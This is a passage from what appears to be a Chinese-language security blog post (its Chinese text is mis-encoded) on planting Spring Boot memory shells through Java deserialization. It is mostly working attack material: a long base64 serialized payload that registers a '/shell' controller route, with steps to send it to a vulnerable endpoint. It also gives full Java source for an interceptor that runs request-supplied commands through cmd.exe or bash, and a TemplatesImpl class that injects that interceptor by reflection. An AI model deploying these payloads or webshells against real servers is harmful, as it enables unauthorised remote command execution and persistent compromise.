BQXdBQVFBQUFBVUFKd0FvQUFBQUFRQXBBQ29BQWdBa0FBQUJxQUFHQUFnQUFBQ3pLeElDdVFBREFnQk9MTGtBQkFFQU9nUXR4Z0NURWdVNkJSSUd1QUFIdGdBSUVnbTJBQXFaQUNHN0FBdFpCcjBBREZrREVnMVRXUVFTRGxOWkJTMVR0d0FQT2dhbkFCNjdBQXRaQnIwQURGa0RFaEJUV1FRU0VWTlpCUzFUdHdBUE9nYTdBQkpaR1FhMkFCTzJBQlMzQUJVU0ZyWUFGem9IR1FlMkFCaVpBQXNaQjdZQUdhY0FCUmtGT2dVWkI3WUFHaGtFR1FXMkFCc1pCTFlBSEJrRXRnQWRwd0FNTEJFQmxMa0FIZ0lBcHdBRVRyRUFBUUFBQUs0QXNRQWZBQU1BSlFBQUFFb0FFZ0FBQUJBQUNRQVJBQkVBRWdBVkFCTUFHUUFWQUNrQUZnQkhBQmdBWWdBYkFIZ0FIQUNNQUIwQWtRQWVBSmdBSHdDZEFDQUFvZ0FoQUtVQUlnQ3VBQ1lBc1FBa0FMSUFKd0FtQUFBQVhBQUpBRVFBQXdBckFDd0FCZ0FaQUlrQUxRQXVBQVVBWWdCQUFDc0FMQUFHQUhnQUtnQXZBREFBQndBSkFLVUFNUUF1QUFNQUVRQ2RBRElBTXdBRUFBQUFzd0FuQUNnQUFBQUFBTE1BTkFBMUFBRUFBQUN6QURZQU53QUNBRGdBQUFBcEFBaitBRWNIQURrSEFEb0hBRG44QUJvSEFEdjhBQ1VIQUR4QkJ3QTUrQUFhK1FBSVFnY0FQUUFBUGdBQUFBa0NBRFFBQUFBMkFBQUFBUUEvQUFBQUFnQkEBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDACXAJgBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9TdHJpbmcHAJkMAJoATAwAmwCcBwCdDACeAJ8HAKAMAKEAogwAowCkAQAQamF2YS9sYW5nL09iamVjdAEAOW9yZy5jbG93bi5zcHJpbmdib290bWVtb3J5c2hlbGwuY29udG9ybGxlci5UZXN0Q29udHJvbGxlcgwApQCmDACnAKgMAKkAqgcAqwwArACtBwCuDACvALABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAEkluc3RhbmNlIGNyZWF0ZWQ6IAwAsQCyDACxALMMALQAtQcAtgwAtwC4BwC5DAC6ALsBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHALwMAL0AvgEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEABi9zaGVsbAwALwC/AQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwALwDAAQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwAwQDCDADDAMQMAMUAxgEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMcAMAEAGmNvbS9jbG93bi9Db250cm9sbGVyQmVoaW5kAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAfYoTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0TWV0aG9kc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9QYXJhbXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Db25zdW1lc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9Qcm9kdWNlc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAHZ2V0QmVhbgEAJShMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL09iamVjdDsBABJnZXREZWNsYXJlZE1ldGhvZHMBAB0oKVtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAD3JlZ2lzdGVyTWFwcGluZwEAbihMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbztMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOylWAQAPcHJpbnRTdGFja1RyYWNlACEALQAuAAAAAAAEAAEALwAwAAEAMQAAAC8AAQABAAAABSq3AAGxAAAAAgAyAAAABgABAAAAEQAzAAAADAABAAAABQA0ADUAAAABADYANwADADEAAAA/AAAAAwAAAAGxAAAAAgAyAAAABgABAAAALAAzAAAAIAADAAAAAQA0ADUAAAAAAAEAOAA5AAEAAAABADoAOwACADwAAAAEAAEAPQA+AAAACQIAOAAAADoAAAABADYAPwADADEAAABJAAAABAAAAAGxAAAAAgAyAAAABgABAAAAMQAzAAAAKgAEAAAAAQA0ADUAAAAAAAEAOAA5AAEAAAABAEAAQQACAAAAAQBCAEMAAwA8AAAABAABAD0APgAAAA0DADgAAABAAAAAQgAAAAgARAAwAAEAMQAAAfsACQALAAAA7BICS7sAA1m3AAQqtgAFTBIGEgcHvQAIWQMSCVNZBBIKU1kFsgALU1kGsgALU7YADE0sBLYADSy4AA62AA8HvQAQWQMSEVNZBCtTWQUDuAASU1kGK764ABJTtgATwAAITi0DvQAItgAUOgQZBAO9ABC2ABU6BbIAFrsAF1m3ABgSGbYAGhkFtgAbtgActgAduAAeEh8DuQAgAwDAACE6BrsAIlkEvQAJWQMSI1O3ACQ6B7sAJVkZBwEBAQEBAbcAJjoIGQYSJ7kAKAIAwAAnOgkttgApAzI6ChkJGQgZBRkKtgAqpwAISyq2ACyxAAEAAADjAOYAKwAEADIAAABKABIAAAAUAAMAFQAPABYAMQAXADYAGABgABkAagAaAHUAGwCPABwAnwAdALEAHgDCAB8A0AAhANgAIgDjACUA5gAjAOcAJADrACcAMwAAAHoADAADAOAARQBGAAAADwDUAEcASAABADEAsgBJAEoAAgBgAIMASwBMAAMAagB5AE0ATgAEAHUAbgBPAFAABQCfAEQAUQBSAAYAsQAyAFMAVAAHAMIAIQBVAFYACADQABMAVwBYAAkA2AALAFkASgAKAOcABABaAFsAAABcAAAAFgACAGAAgwBLAF0AAwBqAHkATQBeAAQAXwAAAAkAAvcA5gcAYAQAAQBhAAAAAgBicHQAA2FhYXB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh2cgASamF2YS5sYW5nLk92ZXJyaWRlAAAAAAAAAAAAAAB4cHEAfgAt<br></code></pre></td></tr></table></figure><p>ç„¶åä¼ ç»™æ¼æ´è·¯ç”±ï¼Œè®°å¾—urlç¼–ç ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241114161649942.png" alt="image-20241114161649942"></p><p>ç„¶åç°åœ¨å°±æ˜¯æˆåŠŸæ‰“å…¥äº†ï¼Œè¿”å›erroræ˜¯é“¾å­ååºåˆ—åŒ–çš„æ—¶å€™æŠ›å¼‚å¸¸ä½†æ˜¯ä»£ç å·²ç»æ˜¯æ‰§è¡Œäº†çš„</p><p>ç°åœ¨è®¿é—®shellè·¯ç”±å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†</p><p><img src="https://cdn.clown2024.cn/image-20241114161757835.png" alt="image-20241114161757835"></p><h2 id="ååºåˆ—åŒ–åˆ©ç”¨interceptor"><a href="#ååºåˆ—åŒ–åˆ©ç”¨Interceptor" class="headerlink" title="ååºåˆ—åŒ–åˆ©ç”¨Interceptor"></a>ååºåˆ—åŒ–åˆ©ç”¨Interceptor</h2><p>è¿™é‡Œçš„åˆ©ç”¨ä¹Ÿç±»ä¼¼ï¼Œé‚£å°±èµ°ä¸€éæµç¨‹</p><p>è¦æ³¨å†Œçš„Interceptor</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.interceptor;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        <span class="hljs-keyword">if</span>(code != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, code&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, code&#125;);<br>                &#125;<br>                p.redirectErrorStream(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> p.start();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                StringBuilder results=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>                <span class="hljs-keyword">while</span>((result=r.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>                    results.append(result+<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br>                System.out.println(results);<br>                writer.println(results);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.postHandle(request, response, handler, modelAndView);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.afterCompletion(request, response, handler, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>TemplatesImplæ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorDes</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br>            <span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(AbstractHandlerMapping.class);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQArAoAKABeCABFCwBfAGALAGEAYggAYwoAZABlCgALAGYIAGcKAAsAaAcAaQcAaggAawgAbAoACgBtCABuCABvCgAKAHAKAAoAcQcAcgcAcwoAdAB1CgAUAHYKABMAdwgAeAcAeQoAGQBeCgATAHoKABkAewgAfAoAGQB9CQBkAH4KAH8AgAoAgQCACgCBAIIKAIEAgwcAhAsAKQCFCwApAIYHAIcHAIgHAIkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAPUxvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAFyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVzdWx0cwEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwBqBwCKBwBpBwCHBwCLBwCMBwCIBwCNBwByBwB5BwCEAQAKRXhjZXB0aW9ucwEAEE1ldGhvZFBhcmFtZXRlcnMBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAKU291cmNlRmlsZQEAFFRlc3RJbnRlcmNlcHRvci5qYXZhDAAqACsHAIsMAI4AjwcAjAwAkACRAQAHb3MubmFtZQcAkgwAkwCPDACUAJUBAAN3aW4MAJYAlwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACoAmAEACS9iaW4vYmFzaAEAAi1jDACZAJoMAJsAnAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCNDACdAJ4MACoAnwwAKgCgAQAAAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAKEAlQwAogCjAQACDQoMAKQAlQwApQCmBwCnDACoAKkHAIoMAKoAKwwAqwArAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAVABVDABYAFkBADtvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcgEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABFqYXZhL2xhbmcvUHJvY2VzcwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQATcmVkaXJlY3RFcnJvclN0cmVhbQEAHShaKUxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEABWZsdXNoAQAFY2xvc2UAIQAnACgAAQApAAAABAABACoAKwABACwAAAAvAAEAAQAAAAUqtwABsQAAAAIALQAAAAYAAQAAAAwALgAAAAwAAQAAAAUALwAwAAAAAQAxADIAAwAsAAACJwAGAAsAAADcKxICuQADAgA6BBkExgDOLLkABAEAOgUSBbgABrYABxIItgAJmQAiuwAKWQa9AAtZAxIMU1kEEg1TWQUZBFO3AA46BqcAH7sAClkGvQALWQMSD1NZBBIQU1kFGQRTtwAOOgYZBgS2ABFXGQa2ABI6B7sAE1m7ABRZGQe2ABW3ABa3ABc6CBIYOgm7ABlZtwAaOgoZCLYAG1k6CcYAIBkKuwAZWbcAGhkJtgAcEh22ABy2AB62ABxXp//bsgAfGQq2ACAZBRkKtgAhGQW2ACIZBbYAI6cABToFA6wErAABAA8A0wDWACQAAwAtAAAAVgAVAAAADwAKABAADwASABcAFAAnABUARgAXAGIAGQBpABoAcAAbAIUAHACJAB0AkgAeAJ0AHwC6ACEAwgAiAMkAIwDOACQA0wAmANYAJQDYACcA2gApAC4AAAB6AAwAQwADADMANAAGABcAvAA1ADYABQBiAHEAMwA0AAYAcABjADcAOAAHAIUATgA5ADoACACJAEoAOwA8AAkAkgBBAD0APgAKAAAA3AAvADAAAAAAANwAPwBAAAEAAADcAEEAQgACAAAA3ABDAEQAAwAKANIARQA8AAQARgAAAFUAB/0ARgcARwcASPwAGwcASf8ALwALBwBKBwBLBwBMBwBNBwBHBwBIBwBJBwBOBwBPBwBHBwBQAAAn/wAbAAUHAEoHAEsHAEwHAE0HAEcAAQcAUQEBAFIAAAAEAAEAJABTAAAADQMAPwAAAEEAAABDAAAAAQBUAFUAAwAsAAAAYAAFAAUAAAAKKissLRkEtwAlsQAAAAIALQAAAAoAAgAAAC4ACQAvAC4AAAA0AAUAAAAKAC8AMAAAAAAACgA/AEAAAQAAAAoAQQBCAAIAAAAKAEMARAADAAAACgBWAFcABABSAAAABAABACQAUwAAABEEAD8AAABBAAAAQwAAAFYAAAABAFgAWQADACwAAABgAAUABQAAAAoqKywtGQS3ACaxAAAAAgAtAAAACgACAAAAMwAJADQALgAAADQABQAAAAoALwAwAAAAAAAKAD8AQAABAAAACgBBAEIAAgAAAAoAQwBEAAMAAAAKAFoAWwAEAFIAAAAEAAEAJABTAAAAEQQAPwAAAEEAAABDAAAAWgAAAAEAXAAAAAIAXQ==&quot;</span>;<br>            <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.interceptor.TestInterceptor&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>            Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>            <span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> (HandlerInterceptor) constructor.newInstance();<br>            adaptInterceptors.add(evilInterceptor);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span 